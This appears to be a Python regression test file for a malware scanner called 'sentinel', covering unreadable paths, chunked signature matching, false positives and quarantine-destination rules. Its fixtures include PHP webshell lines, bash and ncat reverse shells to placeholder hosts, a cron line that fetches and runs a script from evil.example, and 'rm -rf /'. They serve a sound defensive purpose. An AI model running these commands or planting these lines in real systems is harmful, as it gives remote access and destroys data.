"""Régressions des quatre points d'audit restants.

1. Fichiers / dossiers illisibles : signalés, exit 3 (pas un scan vert).
2. Fichiers > 8 Mio : signatures sur tout le fichier, fenêtres + overlap.
3. Faux positifs `ncat` (prose) et `@reboot` (commentaire Python).
4. Quarantaine : le défaut `.sentinel-quarantine` sous $HOME est autorisé ;
   `/`, `$HOME`, `~/.ssh`, `~/.gnupg` restent refusés même avec --force.
"""

from __future__ import annotations

import contextlib
import io
import json
import os
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from sentinel.files import (  # noqa: E402
    DEFAULT_MAX_FILE_BYTES,
    TextWindow,
    iter_text_windows,
    signature_overlap_chars,
)
from sentinel.scanner import scan_folder  # noqa: E402
from sentinel.signatures import (  # noqa: E402
    Sig0002,
    Sig0003,
    Sig0006,
    measured_signature_overlap,
)


def _run(
    *args: str, cwd: Path | None = None, env: dict | None = None
) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, "-m", "sentinel", *args],
        cwd=cwd or ROOT,
        capture_output=True,
        text=True,
        env=env,
    )


def _rules(report, rule_id: str) -> list:
    return [f for f in report.findings if f.rule_id == rule_id]


class TestUnreadablePaths(unittest.TestCase):
    def setUp(self) -> None:
        from tests.osutil import is_privileged

        if is_privileged():
            self.skipTest("root lit les modes 000")

    def test_unreadable_directory_is_reported_and_sibling_is_scanned(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            locked = td_p / "locked"
            locked.mkdir()
            (locked / "evil.php").write_text("<?php eval(base64_decode($_POST['x'])); ?>\n")
            (td_p / "ok.php").write_text("<?php eval(base64_decode($_POST['y'])); ?>\n")
            from tests.osutil import allow_read, deny_read

            previous = deny_read(locked)
            err = io.StringIO()
            try:
                with contextlib.redirect_stderr(err):
                    report = scan_folder(td_p)
            finally:
                allow_read(locked, previous)
            paths = {f.path for f in report.findings}
            self.assertIn("ok.php", paths)
            self.assertFalse(any(p.startswith("locked/") for p in paths))
            self.assertTrue(any(p == "locked" or p.startswith("locked") for p in report.unreadable))
            self.assertEqual(report.exit_code, 3)
            self.assertIn("illisible", err.getvalue())

    def test_cli_exit_3_and_json_lists_the_file(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            secret = td_p / "secret.php"
            secret.write_text("<?php eval(base64_decode($_POST['x'])); ?>\n")
            from tests.osutil import allow_read, deny_read

            previous = deny_read(secret)
            try:
                r = _run("scan", str(td_p), "--format", "json")
            finally:
                allow_read(secret, previous)
            self.assertEqual(r.returncode, 3, r.stderr)
            self.assertIn("illisible", r.stderr)
            data = json.loads(r.stdout)
            self.assertIn("secret.php", data["unreadable"])
            self.assertNotIn("secret.php", [f["path"] for f in data["findings"]])


class TestChunkedSignatures(unittest.TestCase):
    def test_overlap_covers_longest_bounded_marker(self) -> None:
        overlap = measured_signature_overlap()
        self.assertGreaterEqual(overlap, len("-----BEGIN OPENSSH PRIVATE KEY-----"))
        self.assertGreaterEqual(overlap, 512)
        self.assertLess(overlap, 100_000)
        self.assertEqual(signature_overlap_chars(), overlap)

    def test_webshell_past_8mb_keeps_its_line_number(self) -> None:
        header = b"<?php eval(base64_decode($_POST['a'])); ?>\n"
        footer = b"<?php eval(base64_decode($_POST['z'])); ?>\n"
        pad = b"A" * 9999 + b"\n"
        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "big.php"
            written = 0
            lines = 0
            with path.open("wb") as fh:
                fh.write(header)
                written += len(header)
                lines += 1
                while written <= DEFAULT_MAX_FILE_BYTES:
                    fh.write(pad)
                    written += len(pad)
                    lines += 1
                fh.write(footer)
                lines += 1
            report = scan_folder(Path(td))
            hits = sorted(_rules(report, "SIG-0001"), key=lambda f: f.line)
            self.assertEqual([h.line for h in hits], [1, lines], [h.line for h in hits])
            self.assertEqual(len(hits), 2)

    def test_windows_stay_bounded_and_straddle_is_deduped(self) -> None:
        import sentinel.files as files

        old_chunk = files.DEFAULT_MAX_FILE_BYTES
        old_overlap = files.SIGNATURE_OVERLAP_CHARS
        files.DEFAULT_MAX_FILE_BYTES = 64
        files.SIGNATURE_OVERLAP_CHARS = 32
        try:
            with tempfile.TemporaryDirectory() as td:
                path = Path(td) / "x.sh"
                # « bash -i » commence avant la coupe franche (pas de \\n
                # dans les 64 premiers caractères) et tient dans l'overlap.
                body = "A" * 40 + "bash -i >& /dev/tcp/1.2.3.4/9\n" + "tail\n"
                path.write_text(body)
                sizes: list[int] = []
                for window in iter_text_windows(path):
                    self.assertIsInstance(window, TextWindow)
                    sizes.append(len(window.text))
                self.assertGreater(len(sizes), 1)
                self.assertTrue(all(n <= 64 + 32 for n in sizes))
                report = scan_folder(Path(td))
                hits = _rules(report, "SIG-0002")
                self.assertEqual(len(hits), 1, hits)
                self.assertEqual(hits[0].line, 1)
        finally:
            files.DEFAULT_MAX_FILE_BYTES = old_chunk
            files.SIGNATURE_OVERLAP_CHARS = old_overlap

    def test_line_number_across_newline_chunks(self) -> None:
        import sentinel.files as files

        old_chunk = files.DEFAULT_MAX_FILE_BYTES
        old_overlap = files.SIGNATURE_OVERLAP_CHARS
        files.DEFAULT_MAX_FILE_BYTES = 32
        files.SIGNATURE_OVERLAP_CHARS = 16
        try:
            with tempfile.TemporaryDirectory() as td:
                path = Path(td) / "x.sh"
                path.write_text("pad\n" * 4 + "bash -i >& /dev/tcp/1.2.3.4/9\n")
                report = scan_folder(Path(td))
                hits = _rules(report, "SIG-0002")
                self.assertEqual(len(hits), 1, hits)
                self.assertEqual(hits[0].line, 5)
        finally:
            files.DEFAULT_MAX_FILE_BYTES = old_chunk
            files.SIGNATURE_OVERLAP_CHARS = old_overlap


class TestNcatAndRebootFalsePositives(unittest.TestCase):
    def test_ncat_prose_is_not_critical(self) -> None:
        hits = list(Sig0002().scan("README.md", "Also ncat is a tool.\n"))
        self.assertEqual(hits, [])
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "README.md").write_text("Also ncat is a tool.\n")
            report = scan_folder(Path(td))
            self.assertEqual(_rules(report, "SIG-0002"), [])

    def test_ncat_command_contexts_still_match(self) -> None:
        samples = [
            "ncat 10.0.0.1 4444 -e /bin/bash\n",
            "ncat -e /bin/sh 10.0.0.1 4444\n",
            "ncat -lvp 4444 -e /bin/sh\n",
            "ncat --exec /bin/sh -l 4444\n",
            "ncat -c /bin/sh 192.168.1.5 1234\n",
            "ncat evil.example 4444\n",
            "bash -c 'ncat -e /bin/sh 10.1.1.1 443'\n",
            "ncat 10.0.0.1 4444 | bash\n",
            # Commentaire, mais contexte de commande : on ne devient pas aveugle.
            "# ncat -e /bin/sh 10.0.0.1 4444\n",
        ]
        for body in samples:
            hits = list(Sig0002().scan("x.sh", body))
            self.assertEqual(len(hits), 1, body)

    def test_reboot_python_comment_is_not_high_and_not_sig0003(self) -> None:
        body = "# @reboot curl http://evil.example/a | sh\nprint('ok')\n"
        self.assertEqual(list(Sig0006().scan("notes.py", body)), [])
        self.assertEqual(list(Sig0003().scan("notes.py", body)), [])
        prose = "Also @reboot is a cron keyword.\n"
        self.assertEqual(list(Sig0006().scan("notes.py", prose)), [])
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "notes.py").write_text(body)
            report = scan_folder(Path(td))
            self.assertEqual(_rules(report, "SIG-0006"), [])
            self.assertEqual(_rules(report, "SIG-0003"), [])

    def test_reboot_crontab_entry_still_matches(self) -> None:
        line = "@reboot curl http://evil.example/a | sh\n"
        self.assertEqual(len(list(Sig0006().scan("crontab.txt", line))), 1)
        self.assertEqual(len(list(Sig0003().scan("crontab.txt", line))), 1)
        indented = "  @reboot /tmp/backdoor.sh\n"
        hits = list(Sig0006().scan("persist.txt", indented))
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0].line, 1)
        # La commande réelle suivie d'un commentaire reste SIG-0003.
        trailed = "curl http://evil.example/a | sh  # @reboot note\n"
        self.assertEqual(len(list(Sig0003().scan("drop.sh", trailed))), 1)
        self.assertEqual(list(Sig0006().scan("drop.sh", trailed)), [])


class TestQuarantineHomeDefault(unittest.TestCase):
    def _env(self, home: Path) -> dict:
        # Windows : expanduser("~") suit USERPROFILE, pas HOME.
        return {
            **os.environ,
            "HOME": str(home),
            "USERPROFILE": str(home),
            "PYTHONPATH": str(ROOT),
        }

    def test_default_dir_under_home_without_force(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            home = td_p / "home"
            home.mkdir()
            target = home / "evil.sh"
            target.write_text("rm -rf /\n")
            r = _run("quarantine", "evil.sh", cwd=home, env=self._env(home))
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertFalse(target.exists())
            stored = home / ".sentinel-quarantine" / "evil.sh"
            self.assertTrue(stored.is_file())

    def test_default_dir_for_a_file_outside_home(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            home = td_p / "home"
            home.mkdir()
            target = td_p / "evil.sh"
            target.write_text("rm -rf /\n")
            r = _run("quarantine", str(target), cwd=home, env=self._env(home))
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertTrue((home / ".sentinel-quarantine" / "evil.sh").is_file())

    def test_arbitrary_subdir_of_home_still_needs_force_when_it_captures(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            home = td_p / "home"
            home.mkdir()
            target = home / "evil.sh"
            target.write_text("rm -rf /\n")
            dest = home / "quarantine_sub"
            r = _run(
                "quarantine",
                str(target),
                "--dest",
                str(dest),
                cwd=home,
                env=self._env(home),
            )
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertTrue(target.exists())

    def test_ssh_and_gnupg_and_home_and_root_are_hard_denied(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            home = td_p / "home"
            home.mkdir()
            (home / ".ssh").mkdir()
            (home / ".gnupg").mkdir()
            target = td_p / "evil.sh"
            target.write_text("rm -rf /\n")
            env = self._env(home)
            cases = [
                home / ".ssh",
                home / ".ssh" / "extra",
                home / ".gnupg",
                home,
                Path("/"),
            ]
            for dest in cases:
                for force in (False, True):
                    args = ["quarantine", str(target), "--dest", str(dest)]
                    if force:
                        args.append("--force")
                    r = _run(*args, env=env)
                    self.assertEqual(
                        r.returncode,
                        2,
                        f"dest={dest} force={force} rc={r.returncode}\n{r.stderr}",
                    )
                    self.assertTrue(target.exists(), dest)
                    self.assertIn("critique", r.stderr)

    def test_ssh_via_symlink_is_hard_denied_with_force(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            home = td_p / "home"
            home.mkdir()
            real = home / ".ssh"
            real.mkdir()
            link = td_p / "via"
            link.symlink_to(real)
            target = td_p / "evil.sh"
            target.write_text("rm -rf /\n")
            r = _run(
                "quarantine",
                str(target),
                "--dest",
                str(link),
                "--force",
                env=self._env(home),
            )
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertTrue(target.exists())
            self.assertEqual(list(real.iterdir()), [])

    def test_config_is_soft_and_system_dir_without_force(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td_p = Path(td)
            home = td_p / "home"
            home.mkdir()
            target = td_p / "evil.sh"
            target.write_text("rm -rf /\n")
            env = self._env(home)
            cfg = home / ".config" / "q"
            r = _run("quarantine", str(target), "--dest", str(cfg), env=env)
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertTrue(target.exists())
            self.assertFalse(cfg.exists())

            if os.name == "nt":
                win_key = "SYSTEMROOT"
                system = os.environ.get(win_key) or r"C:\Windows"
                etc = Path(system) / "sentinel-audit-should-not-exist"
            else:
                etc = Path("/etc/sentinel-audit-should-not-exist")
            r = _run("quarantine", str(target), "--dest", str(etc), env=env)
            self.assertEqual(r.returncode, 2, r.stderr)
            self.assertTrue(target.exists())
            self.assertFalse(etc.exists())

            r = _run("quarantine", str(target), "--dest", str(cfg), "--force", env=env)
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertFalse(target.exists())
            self.assertTrue((cfg / "evil.sh").is_file())

    def test_quarantine_help_says_jsonl(self) -> None:
        r = _run("quarantine", "--help")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("<dest>/manifest.jsonl", r.stdout)
        self.assertNotIn("<dest>/manifest.json)", r.stdout)


if __name__ == "__main__":
    unittest.main()
